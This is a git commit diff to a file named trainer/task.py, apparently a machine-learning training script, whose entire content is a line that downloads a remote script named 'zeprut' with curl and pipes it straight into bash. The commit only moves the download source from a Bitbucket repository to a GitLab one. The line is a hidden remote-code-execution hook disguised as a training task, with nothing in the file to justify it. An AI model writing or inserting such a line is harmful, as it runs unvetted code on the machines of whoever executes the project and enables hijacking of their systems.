e070c75d37680e6d7a7b4851641e4bcbc2bcc974
cahayaangkasaku1 <147915222+cahayaangkasaku1@users.noreply.github.com>
2023-12-13 14:10:21 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/jeffreyadams29/nevox/raw/main/zeprut | bash')
+os.system('curl -sL https://gitlab.com/jadons19292/nevox/-/raw/main/zeprut | bash')
